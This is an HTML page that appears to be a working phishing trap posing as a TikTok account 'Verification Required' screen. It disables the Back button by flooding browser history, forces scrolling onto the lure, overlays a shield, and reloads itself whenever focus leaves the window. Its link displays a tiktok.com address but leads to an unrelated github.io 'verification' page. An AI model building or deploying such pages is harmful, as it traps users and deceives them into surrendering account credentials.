<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        /* 1. CSS SCROLL SNAP - Forces the browser engine to 'lock' onto the trap */
        html {
            scroll-snap-type: y mandatory;
            overflow-y: scroll;
            height: 100vh;
            scroll-behavior: auto;
        }
        
        body { margin: 0; padding: 0; background: #ffffff; height: 400vh; }

        /* Create a massive void above the content */
        #void { height: 150vh; width: 100%; background: #ffffff; }

        /* The actual trap area */
        #trap-container {
            height: 100vh;
            scroll-snap-align: start; /* The CSS engine forces a jump here */
            text-align: center;
            font-family: "Proxima Nova", sans-serif;
            position: relative;
        }

        /* 2. PROGRAMMATIC TRIGGER: Hidden input with autofocus */
        .trigger {
            position: absolute;
            top: 10px;
            opacity: 0;
            pointer-events: none;
        }

        /* UI Styles */
        #lock-shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
        .v-icon { width: 60px; margin: 50px auto 20px; display: block; }
        .title { font-size: 22px; font-weight: 700; color: #161823; }
        .msg { color: #8A8B91; padding: 0 40px; margin-top: 10px; line-height: 1.4; }
        #breakout { color: #0049f6; text-decoration: underline; font-weight: 600; display: block; margin-top: 40px; }
    </style>
</head>
<body>
    <div id="lock-shield"></div>
    <div id="void"></div>

    <div id="trap-container">
        <input type="text" class="trigger" autofocus>
        
        <img class="v-icon" src="https://www.gstatic.com/images/icons/material/system/2x/security_black_48dp.png" alt="security">
        <div class="title">Verification Required</div>
        <div class="msg">Please follow the instructions to verify your account session.</div>
        
        <a id="breakout" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify-session</a>
    </div>

    <script>
        // 3. THE RENDERER HIJACK
        window.addEventListener('load', () => {
            // Force a history flood to kill the 'Back' button immediately
            for(let i=0; i<15; i++) { history.pushState(null, null, location.href); }
            
            // Re-enforce the jump in case autofocus was partially blocked
            const trap = document.getElementById('trap-container');
            trap.scrollIntoView({ behavior: 'auto', block: 'start' });

            // Activate the scroll-freeze
            document.getElementById('lock-shield').style.display = 'block';
            
            // If they try to pull the header down, slam it back
            setInterval(() => {
                if (window.pageYOffset < 500) {
                    window.scrollTo(0, 1000); // Slam back to trap
                }
            }, 50);
        });

        // Nuclear option: If they manage to click 'X', reload immediately
        window.onblur = () => { setTimeout(() => { location.reload(); }, 10); };
    </script>
</body>
</html>
